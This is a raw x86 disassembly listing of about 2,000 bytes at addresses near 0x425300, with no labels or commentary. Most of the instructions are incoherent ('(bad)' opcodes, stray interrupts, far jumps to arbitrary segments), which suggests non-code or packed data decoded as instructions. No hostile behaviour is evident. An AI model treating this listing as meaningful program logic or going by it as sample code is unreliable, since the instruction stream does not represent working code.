  42528f:	sub    BYTE PTR [ebx-0x2b],dl
  425292:	push   es
  425293:	adc    ecx,ebp
  425295:	xchg   esi,eax
  425296:	stc    
  425297:	int    0x8d
  425299:	stc    
  42529a:	aam    0x58
  42529c:	cmp    esi,eax
  42529e:	shl    edx,cl
  4252a0:	sub    BYTE PTR [ebx],bh
  4252a2:	icebp  
  4252a3:	shl    ebx,cl
  4252a5:	xchg   edx,eax
  4252a6:	push   ebx
  4252a7:	jecxz  0x425276
  4252a9:	(bad)  
  4252aa:	std    
  4252ab:	int    0xa6
  4252ad:	std    
  4252ae:	cmp    edi,DWORD PTR [ebp+0x3b]
  4252b1:	loope  0x425286
  4252b3:	jmp    0x425247
  4252b5:	shl    ebp,cl
  4252b7:	sub    BYTE PTR [ebx+0xc],dl
  4252ba:	aad    0xf3
  4252bc:	int    0x8d
  4252be:	in     eax,dx
  4252bf:	int    0xa6
  4252c1:	in     eax,dx
  4252c2:	cmp    edi,DWORD PTR [ebp+0x3b]
  4252c5:	loope  0x42529a
  4252c7:	jmp    0x42525b
  4252c9:	shl    ebp,cl
  4252cb:	sub    BYTE PTR [ebx+0xc],dl
  4252ce:	cmp    esp,ebx
  4252d0:	in     al,dx
  4252d1:	sub    al,0x3b
  4252d3:	lock shl edx,cl
  4252d6:	sub    BYTE PTR [ebx],bh
  4252d8:	icebp  
  4252d9:	shl    ebx,cl
  4252db:	xchg   edx,eax
  4252dc:	push   ebx
  4252dd:	jecxz  0x4252ac
  4252df:	(bad)  
  4252e0:	std    
  4252e1:	int    0xa6
  4252e3:	std    
  4252e4:	cmp    edi,DWORD PTR [ebp+0x3b]
  4252e7:	loope  0x4252bc
  4252e9:	jmp    0x42527d
  4252eb:	shl    ebp,cl
  4252ed:	sub    BYTE PTR [ebx+0xc],dl
  4252f0:	aad    0xf3
  4252f2:	or     dl,BYTE PTR [esi-0x2723207]
  4252f8:	int    0x96
  4252fa:	std    
  4252fb:	cmp    edi,DWORD PTR [ebp+0x3b]
  4252fe:	(bad)  
  425300:	jmp    0x425294
  425302:	shr    edx,cl
  425304:	sub    BYTE PTR [ebx+0x13],dl
  425307:	xchg   DWORD PTR [edx],eax
  425309:	int    0x8d
  42530b:	cmc    
  42530c:	int    0x96
  42530e:	cmc    
  42530f:	cmp    ebx,ecx
  425311:	cmp    edi,DWORD PTR [ebp-0x2d]
  425314:	jmp    0x1353:0x92ebd328
  42531b:	int    0x96
  42531d:	std    
  42531e:	int    0xa6
  425320:	std    
  425321:	cmp    esi,ecx
  425323:	cmp    esp,ecx
  425325:	shl    ebp,cl
  425327:	sub    bl,dl
  425329:	repz xchg edx,eax
  42532b:	push   ebx
  42532c:	aad    0x33
  42532e:	adc    eax,DWORD PTR [ebx+0x2]
  425331:	das    
  425332:	pop    es
  425333:	pop    edx
  425334:	add    BYTE PTR [eax],al
  425336:	add    ch,cl
  425338:	jbe    0x425333
  42533a:	int    0x8d
  42533c:	mov    BYTE PTR [edx-0x327ef558],ch
  425342:	jbe    0x42533d
  425344:	arpl   bx,cx
  425346:	rol    BYTE PTR [eax+eax*4+0x3bedcd96],cl
  42534d:	ins    DWORD PTR es:[edi],dx
  42534e:	pop    esi
  42534f:	jbe    0x42539d
  425351:	aam    0x3a
  425353:	pop    esi
  425354:	jbe    0x4252de
  425356:	fdiv   DWORD PTR [edx]
  425358:	retf   0x8814
  42535b:	or     DWORD PTR [esi-0x69a6d0d1],edx
  425361:	das    
  425362:	adc    dh,bl
  425364:	in     eax,dx
  425365:	add    BYTE PTR [eax+0x2f960980],0xf1
  42536c:	lea    ebp,[edi]
  42536e:	retf   0x2f96
  425371:	or     DWORD PTR [eax+ecx*4],edx
  425374:	ins    BYTE PTR es:[edi],dx
  425375:	inc    ebx
  425376:	jbe    0x425300
  425378:	sub    BYTE PTR [ecx+0x7188d600],0xbd
  42537f:	stc    
  425380:	std    
  425381:	add    BYTE PTR [eax],al
  425383:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425384:	ror    BYTE PTR [eax-0x12326980],cl
  42538a:	adc    ch,ch
  42538c:	cmp    al,0x84
  42538e:	add    BYTE PTR [eax+0x49bf985b],0x21
  425395:	xchg   BYTE PTR ds:0xc911a60a,dh
  42539b:	jbe    0x42539a
  42539d:	inc    ecx
  42539e:	and    DWORD PTR [esi-0x128936cb],eax
  4253a4:	dec    ecx
  4253a5:	sub    DWORD PTR [esi-0x4a8936cb],eax
  4253ab:	jno    0x425363
  4253ad:	cli    
  4253ae:	arpl   bp,cx
  4253b0:	jbe    0x4253c3
  4253b2:	int    0x8d
  4253b4:	adc    DWORD PTR [edx+0x77cfffc0],ebx
  4253ba:	sub    DWORD PTR [edx-0xfc486c5],0xd392bdd3
  4253c4:	repnz sub BYTE PTR [ebx-0x2d],dl
  4253c8:	or     dh,BYTE PTR [esi-0x7]
  4253cb:	leave  
  4253cc:	jbe    0x425373
  4253ce:	into   
  4253cf:	and    DWORD PTR [esi-0x628936cb],eax
  4253d5:	inc    esi
  4253d6:	sbb    DWORD PTR [ebp-0x528936de],esi
  4253dc:	mov    BYTE PTR [eax-0x34327f80],al
  4253e2:	int    0x76
  4253e4:	std    
  4253e5:	int    0x8d
  4253e7:	std    
  4253e8:	cmp    esi,eax
  4253ea:	shl    edx,cl
  4253ec:	sub    BYTE PTR [ebx],bh
  4253ee:	jns    0x4253c3
  4253f0:	mov    ebp,0xcdd35392
  4253f5:	lea    edx,[ecx]
  4253f7:	int    0x96
  4253f9:	adc    DWORD PTR [ebx],edi
  4253fb:	(bad)  
  4253fd:	(bad)  
  4253ff:	jmp    0x425393
  425401:	shr    edx,cl
  425403:	sub    BYTE PTR [ebx+0x13],dl
  425406:	das    
  425407:	rcl    ebx,1
  425409:	in     al,dx
  42540a:	outs   dx,BYTE PTR ds:[esi]
  42540b:	int    0x76
  42540d:	cmc    
  42540e:	int    0x8d
  425410:	cmc    
  425411:	sar    DWORD PTR [ebp-0x6d0d2cd8],cl
  425417:	push   ebx
  425418:	sar    DWORD PTR [ebx],cl
  42541a:	lds    ecx,FWORD PTR [edx]
  42541c:	jbe    0x425417
  42541e:	iret   
  42541f:	jbe    0x42541a
  425421:	jo     0x4253e0
  425423:	mov    ecx,0xa0000fe
  425428:	jbe    0x425423
  42542a:	int    0x76
  42542c:	stc    
  42542d:	int    0x8d
  42542f:	cmc    
  425430:	or     al,BYTE PTR ds:0xfc9dcf
  425436:	add    ch,cl
  425438:	jbe    0x425437
  42543a:	int    0x8d
  42543c:	std    
  42543d:	cmp    edi,DWORD PTR [ecx+0x3b]
  425440:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  425447:	push   ebx
  425448:	rol    DWORD PTR [edi+0x760af576],cl
  42544e:	cmc    
  42544f:	int    0x76
  425451:	in     eax,dx
  425452:	int    0x8d
  425454:	in     eax,dx
  425455:	cmp    esi,eax
  425457:	shl    edx,cl
  425459:	sub    BYTE PTR [ebx],bh
  42545b:	jns    0x425430
  42545d:	mov    ebp,0xcdd35392
  425462:	(bad)  
  425463:	std    
  425464:	int    0x96
  425466:	std    
  425467:	cmp    ecx,DWORD PTR [edi]
  425469:	cmp    ebx,ecx
  42546b:	shr    ebx,cl
  42546d:	xchg   edx,eax
  42546e:	shr    edx,cl
  425470:	sub    BYTE PTR [ebx+0x13],dl
  425473:	xor    edx,ebx
  425475:	int    0x8d
  425477:	cmc    
  425478:	inc    ebx
  425479:	jge    0x425453
  42547b:	mov    bl,0xcd
  42547d:	jbe    0x425434
  42547f:	int    0x8d
  425481:	mov    ch,0x3b
  425483:	jns    0x4254c0
  425485:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  42548c:	push   ebx
  42548d:	ror    DWORD PTR [edx],cl
  42548f:	jbe    0x42548a
  425491:	leave  
  425492:	jbe    0x425481
  425494:	bound  ebx,QWORD PTR [edi]
  425496:	xchg   BYTE PTR ds:0x1ebddcd,dh
  42549c:	add    BYTE PTR [eax-0x5a723280],0xcd
  4254a3:	jbe    0x42544a
  4254a5:	cmp    ecx,ecx
  4254a7:	shr    DWORD PTR [ebp-0x2cf0c4d8],cl
  4254ad:	jmp    0x425441
  4254af:	push   ebx
  4254b0:	jge    0x42547f
  4254b2:	jbe    0x4254ad
  4254b4:	aad    0xbd
  4254b6:	or     dh,BYTE PTR [esi-0x63]
  4254b9:	int    0x76
  4254bb:	mov    dl,cl
  4254bd:	or     BYTE PTR [ecx],0x76
  4254c0:	in     al,dx
  4254c1:	retf   0xec76
  4254c4:	int    0x8d
  4254c6:	stc    
  4254c7:	das    
  4254c8:	pop    ecx
  4254c9:	ins    DWORD PTR es:[edi],dx
  4254ca:	cmp    edx,ebx
  4254cc:	or     dh,BYTE PTR [esi-0xb]
  4254cf:	int    0x76
  4254d1:	in     eax,dx
  4254d2:	int    0x8d
  4254d4:	in     eax,dx
  4254d5:	cmp    edi,DWORD PTR [ecx-0x2d]
  4254d8:	mov    ebp,0xd3f03b92
  4254dd:	repnz sub BYTE PTR [ebx-0x2d],dl
  4254e1:	int    0x8d
  4254e3:	cmc    
  4254e4:	sub    edx,ebx
  4254e6:	int    0x5
  4254e8:	push   es
  4254e9:	popf   
  4254ea:	cld    
  4254eb:	add    BYTE PTR [eax],al
  4254ed:	int    0x8d
  4254ef:	popf   
  4254f0:	cmp    edx,ebx
  4254f2:	or     dh,BYTE PTR [esi-0x7]
  4254f5:	int    0x76
  4254f7:	std    
  4254f8:	int    0x8d
  4254fa:	std    
  4254fb:	cmp    edi,DWORD PTR [ecx+0x3b]
  4254fe:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  425505:	push   ebx
  425506:	rol    DWORD PTR [ecx+0x76cd8876],cl
  42550c:	std    
  42550d:	int    0x8d
  42550f:	std    
  425510:	cmp    edi,DWORD PTR [ecx+0x3b]
  425513:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  42551a:	push   ebx
  42551b:	sar    DWORD PTR [esi],cl
  42551d:	jbe    0x4254cc
  42551f:	int    0x76
  425521:	adc    ebp,ecx
  425523:	lea    edx,[ecx]
  425525:	cmp    esi,eax
  425527:	cmp    edi,DWORD PTR [ecx-0x2d]
  42552a:	repnz sub bl,dl
  42552d:	mov    ebp,0xcdd35392
  425532:	lea    ebp,[ebp+0x62f7d43]
  425538:	imul   eax,DWORD PTR [eax],0x0
  42553b:	add    ch,cl
  42553d:	jbe    0x4254f4
  42553f:	int    0x8d
  425541:	mov    ch,0x3b
  425543:	jns    0x425580
  425545:	lock shl edx,cl
  425548:	sub    bl,dl
  42554a:	mov    ebp,0xd353aa92
  42554f:	int    0x8d
  425551:	stc    
  425552:	test   al,0x3b
  425554:	shl    DWORD PTR [ebx-0x35],cl
  425557:	rol    BYTE PTR [eax+eax*4+0x4edcd96],cl
  42555e:	in     eax,dx
  42555f:	xor    BYTE PTR [ebx],bh
  425561:	retf   
  425562:	pop    ebx
  425563:	call   0xbb05:0x2f888d5e
  42556a:	add    BYTE PTR [eax+0x2f024380],0x5
  425571:	rol    DWORD PTR [eax-0x44d07f80],1
  425577:	cwde   
  425578:	sub    al,0x5d
  42557a:	lahf   
  42557b:	xor    eax,0x8d0a8080
  425580:	std    
  425581:	or     cl,BYTE PTR [ebp+0xaf13b11]
  425587:	(bad)  
  425588:	stc    
  425589:	mov    eax,0xe3b813cd
  42558e:	retf   
  42558f:	cmp    eax,DWORD PTR [eax]
  425591:	leave  
  425592:	jbe    0x425589
  425594:	adc    al,0x80
  425596:	add    BYTE PTR [eax+0x77fa43b8],0xc4
  42559d:	mov    eax,0xb8fde6cd
  4255a2:	jecxz  0x42556d
  4255a4:	mov    eax,0xbb2ff93b
  4255a9:	(bad)  
  4255aa:	stc    
  4255ab:	iret   
  4255ac:	dec    esp
  4255ad:	into   
  4255ae:	mov    eax,0xd692de5e
  4255b3:	pop    edx
  4255b4:	das    
  4255b5:	mov    ebx,0xf58d0a89
  4255ba:	mov    eax,0x4dd67d43
  4255bf:	das    
  4255c0:	mov    ebx,0xa6cdfd8d
  4255c5:	mov    BYTE PTR [ecx],al
  4255c7:	fs push ds
  4255c9:	adc    ah,0x3b
  4255cc:	das    
  4255cd:	mov    ebx,0xa6cdfd8d
  4255d2:	mov    BYTE PTR [eax+0x1e4c692f],bh
  4255d8:	mov    eax,0x3bb8d3e3
  4255dd:	jge    0x425597
  4255df:	pop    esi
  4255e0:	(bad)  
  4255e1:	cmc    
  4255e2:	aam    0x23
  4255e4:	leave  
  4255e5:	jbe    0x4255dc
  4255e7:	sbb    BYTE PTR [eax+0x76008080],al
  4255ed:	stc    
  4255ee:	int    0x7d
  4255f0:	mov    eax,0xb82c8e3b
  4255f5:	jecxz  0x4255c2
  4255f7:	mov    eax,0x82f98d5e
  4255fc:	inc    ecx
  4255fd:	in     al,dx
  4255fe:	dec    edx
  4255ff:	add    BYTE PTR [esi+0x11],dh
  425602:	leave  
  425603:	jbe    0x4255fa
  425605:	push   ss
  425606:	add    BYTE PTR [eax-0x1944d080],0xfd
  42560d:	int    0xa6
  42560f:	mov    BYTE PTR [ebx],bh
  425611:	retf   
  425612:	pop    esp
  425613:	dec    esp
  425614:	sub    dl,ah
  425616:	push   ss
  425617:	add    BYTE PTR [esi-0x3],dh
  42561a:	add    al,0xe6
  42561c:	cmc    
  42561d:	sbb    BYTE PTR [edi],ch
  42561f:	push   es
  425620:	jb     0x425622
  425622:	add    BYTE PTR [eax],al
  425624:	cmp    ebp,DWORD PTR [ebp-0x56]
  425627:	arpl   bx,cx
  425629:	rol    BYTE PTR [eax+eax*4-0x47ee7233],cl
  425630:	jecxz  0x425605
  425632:	mov    eax,0x6d3b7d3b
  425637:	mov    eax,0x2f2c8e43
  42563c:	adc    eax,0x96b9ec6d
  425641:	int    0xed
  425643:	add    al,0xed
  425645:	mov    esp,0xc09a985b
  42564a:	inc    esp
  42564b:	add    dh,dl
  42564d:	mov    ch,cl
  42564f:	adc    DWORD PTR [ebp+0xf90b],edi
  425655:	iret   
  425656:	js     0x42568a
  425658:	or     dh,BYTE PTR [esi+0x25]
  42565b:	iret   
  42565c:	js     0x4256d2
  42565e:	or     dh,BYTE PTR [esi+0x2d]
  425661:	iret   
  425662:	js     0x42561c
  425664:	or     dh,BYTE PTR [esi+0x35]
  425667:	iret   
  425668:	pop    es
  425669:	or     DWORD PTR [eax+0x760a8080],eax
  42566f:	cmp    eax,0x804107cf
  425674:	add    BYTE PTR [eax-0x30ba89f6],0x7
  42567b:	or     eax,0xa808080
  425680:	jbe    0x425652
  425682:	iret   
  425683:	pop    es
  425684:	out    dx,eax
  425685:	add    BYTE PTR [eax+0x55760a80],0xcf
  42568c:	pop    es
  42568d:	xor    BYTE PTR [ecx+0x760a8080],al
  425693:	pop    ebp
  425694:	iret   
  425695:	pop    es
  425696:	inc    edx
  425697:	add    DWORD PTR [eax+0x65760a80],0xcf1dd60a
  4256a1:	pop    es
  4256a2:	xchg   esp,eax
  4256a3:	add    DWORD PTR [eax+0x6d760a80],0x813d07cd
  4256ad:	add    BYTE PTR [eax-0x25c4af33],0xa
  4256b4:	xchg   esi,eax
  4256b5:	icebp  
  4256b6:	or     dl,BYTE PTR [esi-0x6269f56b]
  4256bc:	or     dl,BYTE PTR [esi+0x7d76c9a5]
  4256c2:	(bad)  
  4256c3:	mov    cl,0xde
  4256c5:	adc    ebx,DWORD PTR [ebp-0x43]
  4256c8:	or     ah,BYTE PTR [ebx]
  4256ca:	and    eax,0xcd0d760a
  4256cf:	lea    edi,[ebp-0x33]
  4256d2:	out    0xd,al
  4256d4:	cmp    edi,ecx
  4256d6:	adc    al,BYTE PTR [edx]
  4256d8:	jnp    0x425711
  4256da:	ficom  WORD PTR [ebx]
  4256dc:	das    
  4256dd:	inc    ebp
  4256de:	cli    
  4256df:	xchg   edx,eax
  4256e0:	rcl    DWORD PTR [eax],cl
  4256e2:	xchg   edx,eax
  4256e3:	or     ah,dh
  4256e5:	mov    ch,0xcd
  4256e7:	out    0x7d,al
  4256e9:	int    0xa6
  4256eb:	or     eax,0x3be1cd
  4256f0:	cmp    eax,DWORD PTR [ebx]
  4256f2:	shl    ebp,cl
  4256f4:	sub    BYTE PTR [ebx-0x10],dl
  4256f7:	int    0xe6
  4256f9:	mov    ch,0x61
  4256fb:	add    BYTE PTR [eax-0x1dc49380],0x53
  425702:	cld    
  425703:	push   ebx
  425704:	lock or dl,dh
  425707:	stc    
  425708:	das    
  425709:	add    eax,0x808080f2
  42570e:	adc    dh,BYTE PTR [esi-0xf]
  425711:	(bad)  
  425712:	mov    esp,0xeb5f8bbd
  425717:	or     ah,BYTE PTR [ebx]
  425719:	and    eax,0x12958d31
  42571e:	jbe    0x4256bd
  425720:	(bad)  
  425721:	mov    esp,0x8d318790
  425726:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425727:	int    0x8d
  425729:	jge    0x4256f8
  42572b:	(bad)  
  42572c:	or     eax,0xcd7de6cd
  425731:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425732:	or     eax,0x212113b
  425737:	jnp    0x425770
  425739:	ficom  WORD PTR [ebx]
  42573b:	das    
  42573c:	inc    ebp
  42573d:	add    dl,BYTE PTR [edx-0x2cd7162d]
  425743:	out    dx,eax
  425744:	xchg   edx,eax
  425745:	cmp    ebx,ebp
  425747:	cmp    eax,DWORD PTR [ebx]
  425749:	push   ebx
  42574a:	or     al,0x53
  42574c:	clc    
  42574d:	add    al,0xd3
  42574f:	add    BYTE PTR [ecx+ebx*4],al
  425752:	add    BYTE PTR [edx],cl
  425754:	lea    edi,[ebp+0xa]
  425757:	(bad)  
  425758:	or     eax,0x53f18dcd
  42575d:	lea    edx,[ebp+0x761223d4]
  425763:	icebp  
  425764:	mov    edx,DWORD PTR [ebx]
  425766:	dec    edx
  425767:	stc    
  425768:	pop    edi
  425769:	sbb    al,bl
  42576b:	mov    ch,0x6b
  42576d:	xor    DWORD PTR [ebp-0x6289ed6b],ecx
  425773:	(bad)
  425776:	std    
  425777:	xor    DWORD PTR [ebp+0x121ceca5],ecx
  42577d:	(bad)  
  42577e:	icebp  
  42577f:	(bad)  
  425780:	mov    esp,0x76897abd
  425785:	xchg   ebp,eax
  425786:	adc    dh,BYTE PTR [esi-0x6f433963]
  42578c:	add    al,0x12
  42578e:	mov    dh,0xa5
  425790:	jmp    0x42579c
  425792:	and    esp,DWORD PTR ds:0xcd7d8dcd
  425798:	lea    ecx,ds:0xcd7de6cd
  42579e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42579f:	or     eax,0x92fc352f
  4257a4:	shr    ebx,cl
  4257a6:	sub    BYTE PTR [ebx],bh
  4257a8:	not    DWORD PTR [ebx-0xc]
  4257ab:	shr    ecx,cl
  4257ad:	xchg   edx,eax
  4257ae:	push   ebx
  4257af:	lock adc al,BYTE PTR [edx]
  4257b2:	(bad)  
  4257b3:	aaa    
  4257b4:	ficom  WORD PTR [ebx]
  4257b6:	or     cl,BYTE PTR [ebp+0xa113b7d]
  4257bc:	(bad)  
  4257bd:	or     eax,0xcd7d8dcd
  4257c2:	(bad)  
  4257c3:	or     eax,0xcd7de6cd
  4257c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4257c9:	or     eax,0x212113b
  4257ce:	jnp    0x425807
  4257d0:	ficom  WORD PTR [ebx]
  4257d2:	das    
  4257d3:	inc    ebp
  4257d4:	add    dl,BYTE PTR [edx-0x2cd7162d]
  4257da:	out    dx,eax
  4257db:	xchg   edx,eax
  4257dc:	cmp    ebx,ebp
  4257de:	cmp    eax,DWORD PTR [ebx]
  4257e0:	push   ebx
  4257e1:	or     al,0x53
  4257e3:	clc    
  4257e4:	push   ebx
  4257e5:	comiss xmm0,DWORD PTR [esi]
  4257e8:	xor    al,BYTE PTR [eax]
  4257ea:	add    BYTE PTR [eax],al
  4257ec:	int    0xd6
  4257ee:	stc    
  4257ef:	push   es
  4257f0:	imul   DWORD PTR [edi]
  4257f2:	add    eax,0x808080d1
  4257f7:	int    0x78
  4257f9:	fs int 0xe4
  4257fc:	push   eax
  4257fd:	fadd   QWORD PTR [edi+0x349acdff]
  425803:	int    0x6f
  425805:	and    al,0xcd
  425807:	jp     0x425835
  425809:	int    0xaa
  42580b:	sbb    al,0x87
  42580d:	cdq    
  42580e:	or     dl,BYTE PTR [esi+0x149acd0d]
  425814:	xchg   DWORD PTR [edi],ecx
  425816:	xchg   DWORD PTR [ecx+0xa],edi
  425819:	(bad)  
  42581a:	in     eax,dx
  42581b:	or     dh,BYTE PTR [esi-0x6b]
  42581e:	or     dl,BYTE PTR [esi+0x7bd543f5]
  425824:	xchg   DWORD PTR [edx],ecx
  425826:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425827:	cmc    
  425828:	cmp    ebx,edx
  42582a:	or     dl,BYTE PTR [esi-0xa69a15b]
  425830:	fcom   st(4)
  425832:	in     al,dx
  425833:	xchg   ebp,ecx
  425835:	jbe    0x4257cc
  425837:	int    0xa6
  425839:	or     eax,0x5b24bb2f
  42583e:	inc    ebx
  42583f:	call   0x14aa:0x436b771c
  425846:	ja     0x4257f0
  425848:	int    0x84
  42584a:	mov    al,0xcd
  42584c:	xchg   esi,eax
  42584d:	mov    ch,cl
  42584f:	and    al,0x1f
  425851:	or     dl,BYTE PTR [esi-0x30867803]
  425857:	xchg   esi,eax
  425858:	sbb    eax,0x9633a987
  42585d:	mov    BYTE PTR [edx],cl
  42585f:	jbe    0x425872
  425861:	or     dl,BYTE PTR [esi-0x4a89368b]
  425867:	push   ebx
  425868:	add    BYTE PTR [eax-0x2693280],0x4
  42586f:	pusha  
  425870:	adc    dh,0x28
  425873:	jo     0x425842
  425875:	jbe    0x4258ec
  425877:	int    0x54
  425879:	xor    BYTE PTR [ebp+0xfddd],bh
  42587f:	int    0xd6
  425881:	stc    
  425882:	int    0x8d
  425884:	in     eax,dx
  425885:	push   es
  425886:	ins    DWORD PTR es:[edi],dx
  425887:	aam    0x85
  425889:	int    0x76
  42588b:	std    
  42588c:	or     bl,BYTE PTR [ecx*8+0x76041176]
  425893:	std    
  425894:	test   BYTE PTR [eax],al
  425896:	lea    esi,[ebp-0x69321c2a]
  42589c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42589d:	push   edx
  42589e:	or     dl,BYTE PTR [esi-0xa69bc5b]
  4258a4:	or     dh,0xaa
  4258a7:	int    0x79
  4258a9:	test   al,0x63
  4258ab:	retf   
  4258ac:	rol    BYTE PTR [eax+eax*4-0x6712326a],cl
  4258b3:	int    0xd6
  4258b5:	mov    BYTE PTR [eax],al
  4258b7:	pop    ecx
  4258b8:	adc    DWORD PTR [ecx+0x76cd8080],eax
  4258be:	mov    BYTE PTR [ebp+0xfee4],bh
  4258c4:	int    0x7
  4258c6:	cmp    eax,0x3b808081
  4258cb:	retf   
  4258cc:	pop    esi
  4258cd:	mov    BYTE PTR [eax-0x322ce8d1],ch
  4258d3:	shl    DWORD PTR [esi-0x327f7b2e],cl
  4258d9:	fwait
  4258da:	sbb    eax,0x5b808081
  4258df:	cwde   
  4258e0:	int    0x11
  4258e2:	pop    ebp
  4258e3:	lahf   
  4258e4:	xor    eax,0x4eec8080
  4258e9:	cmp    edi,DWORD PTR [ebp-0x48]
  4258ec:	jecxz  0x4258b9
  4258ee:	mov    eax,0xd2044a0a
  4258f3:	xchg   edx,eax
  4258f4:	add    al,0x79
  4258f6:	xchg   edx,eax
  4258f7:	das    
  4258f8:	mov    ebx,0x7d43b84e
  4258fd:	(bad)  
  4258fe:	repz cmp ebp,DWORD PTR [ebp-0x58]
  425902:	mov    eax,0x8cd920a
  425907:	sbb    eax,0x63808081
  42590c:	lds    ebx,FWORD PTR [edx+0x7cdf9cd]
  425912:	sbb    eax,0xd3808081
  425917:	jmp    0xed0be0a2
  42591c:	dec    edx
  42591d:	add    DWORD PTR [edx],eax
  42591f:	add    DWORD PTR [ecx],0xffffffeb
  425922:	mov    esi,0x526c8809
  425927:	retf   0x14a
  42592a:	cli    
  42592b:	sbb    dh,dl
  42592d:	adc    BYTE PTR [ecx-0x80],bh
  425930:	or     ch,0x7
  425933:	sbb    eax,0x87808081
  425938:	leave  
  425939:	stos   BYTE PTR es:[edi],al
  42593a:	lds    edx,FWORD PTR [esi-0x12ed1233]
  425940:	mov    al,0x80
  425942:	add    BYTE PTR [eax+0xabd5f5b],0x23
  425949:	and    eax,0x76c99a98
  42594e:	cmc    
  42594f:	xchg   ecx,eax
  425950:	aaa    
  425951:	ficom  WORD PTR [ebx]
  425953:	or     cl,BYTE PTR [ebp-0x12893607]
  425959:	(bad)  
  42595a:	aaa    
  42595b:	ficom  WORD PTR [ebx]
  42595d:	or     cl,BYTE PTR [ebp-0x3692c4ef]
  425963:	jbe    0x425922
  425965:	dec    ecx
  425966:	and    DWORD PTR [esi-0x28936cb],eax
  42596c:	inc    ecx
  42596d:	and    DWORD PTR [esi-0xe8936cb],eax
  425973:	out    0x37,al
  425975:	ficom  WORD PTR [ebx]
  425977:	or     cl,BYTE PTR [ebp+0x5d76c995]
  42597d:	fidiv  WORD PTR [edi]
  42597f:	ficom  WORD PTR [ebx]
  425981:	or     cl,BYTE PTR [ebp-0x1289329b]
  425987:	int    0x96
  425989:	adc    DWORD PTR [edi],ebp
  42598b:	inc    ebp
  42598c:	icebp  
  42598d:	xchg   edx,eax
  42598e:	shl    ebx,cl
  425990:	xchg   edx,eax
  425991:	int    0x96
  425993:	in     eax,dx
  425994:	int    0xd6
  425996:	adc    ebx,edx
  425998:	jmp    0x4229:0xbea6c328
  42599f:	cmp    ecx,ecx
  4259a1:	cmp    esi,edi
  4259a3:	push   ebx
  4259a4:	jns    0x4259b0
  4259a6:	jbe    0x42594d
  4259a8:	iret   
  4259a9:	jbe    0x425958
  4259ab:	or     dh,BYTE PTR [esi+0xd]
  4259ae:	int    0x76
  4259b0:	or     eax,0x8621d169
  4259b5:	xor    eax,0x37b680c9
  4259ba:	ficom  WORD PTR [ebx]
  4259bc:	or     bh,BYTE PTR [esp+eax*4-0x33]
  4259c0:	(bad)  
  4259c1:	std    
  4259c2:	int    0x96
  4259c4:	std    
  4259c5:	cmp    ecx,DWORD PTR [edi]
  4259c7:	shr    ebx,cl
  4259c9:	xchg   edx,eax
  4259ca:	sar    bh,0x9c
  4259cd:	cmp    esi,ecx
  4259cf:	shr    edx,cl
  4259d1:	sub    BYTE PTR [ebx+0x13],dl
  4259d4:	int    0x96
  4259d6:	std    
  4259d7:	int    0xa6
  4259d9:	std    
  4259da:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  4259e0:	popf   
  4259e1:	shl    ebp,cl
  4259e3:	sub    BYTE PTR [ebx-0x2b],dl
  4259e6:	xchg   DWORD PTR [ebx],edx
  4259e8:	int    0x96
  4259ea:	std    
  4259eb:	int    0xa6
  4259ed:	std    
  4259ee:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  4259f4:	popf   
  4259f5:	shl    ebp,cl
  4259f7:	sub    BYTE PTR [ebx-0x2b],dl
  4259fa:	xchg   DWORD PTR [ebx],edx
  4259fc:	int    0x96
  4259fe:	std    
  4259ff:	int    0xa6
  425a01:	std    
  425a02:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425a08:	popf   
  425a09:	shl    ebp,cl
  425a0b:	sub    BYTE PTR [ebx-0x2b],dl
  425a0e:	xchg   DWORD PTR [ebx],edx
  425a10:	or     cl,bh
  425a12:	nop
  425a13:	add    BYTE PTR [eax],al
  425a15:	add    ch,cl
  425a17:	lea    edi,[ebp+0x3bbd96cd]
  425a1d:	icebp  
  425a1e:	cmp    ecx,DWORD PTR [edi]
  425a20:	shr    edx,cl
  425a22:	sub    bl,dl
  425a24:	jmp    0x4259b8
  425a26:	push   ebx
  425a27:	adc    ecx,ebp
  425a29:	xchg   esi,eax
  425a2a:	mov    ebp,0x3bbda6cd
  425a2f:	cdq    
  425a30:	cmp    ebx,DWORD PTR [ebp-0x2c6d0c2d]
  425a36:	in     eax,0x28
  425a38:	push   ebx
  425a39:	aad    0xa
  425a3b:	int3   
  425a3c:	pop    ss
  425a3d:	aam    0x0
  425a3f:	add    BYTE PTR [eax],al
  425a41:	int    0x8d
  425a43:	dec    esp
  425a44:	int    0x89
  425a46:	int    0x96
  425a48:	std    
  425a49:	int    0xa6
  425a4b:	std    
  425a4c:	int    0x7e
  425a4e:	jo     0x425a8b
  425a50:	popf   
  425a51:	cmp    ebx,DWORD PTR [ecx-0x2c6d0c2d]
  425a57:	in     eax,0x28
  425a59:	push   ebx
  425a5a:	aad    0xa
  425a5c:	int3   
  425a5d:	pop    ss
  425a5e:	aam    0x0
  425a60:	add    BYTE PTR [eax],al
  425a62:	int    0x8d
  425a64:	xor    ch,cl
  425a66:	xchg   esi,eax
  425a67:	xor    BYTE PTR [ebx],bh
  425a69:	icebp  
  425a6a:	cmp    ecx,DWORD PTR [edi]
  425a6c:	shr    edx,cl
  425a6e:	sub    bl,dl
  425a70:	jmp    0x425a04
  425a72:	push   ebx
  425a73:	adc    ecx,ebp
  425a75:	xchg   esi,eax
  425a76:	std    
  425a77:	int    0xa6
  425a79:	std    
  425a7a:	cmp    ebx,DWORD PTR [ebp+0x3bfd76cd]
  425a80:	cdq    
  425a81:	shl    ebx,cl
  425a83:	xchg   edx,eax
  425a84:	shl    ebp,cl
  425a86:	sub    BYTE PTR [ebx-0x2b],dl
  425a89:	int    0xa6
  425a8b:	std    
  425a8c:	cmp    edi,DWORD PTR [ecx-0x2d]
  425a8f:	mov    ebp,0xfff40492
  425a94:	shl    ebp,cl
  425a96:	sub    BYTE PTR [ebx-0x3b],dl
  425a99:	xchg   ecx,esi
  425a9b:	int    0x76
  425a9d:	adc    al,0xa
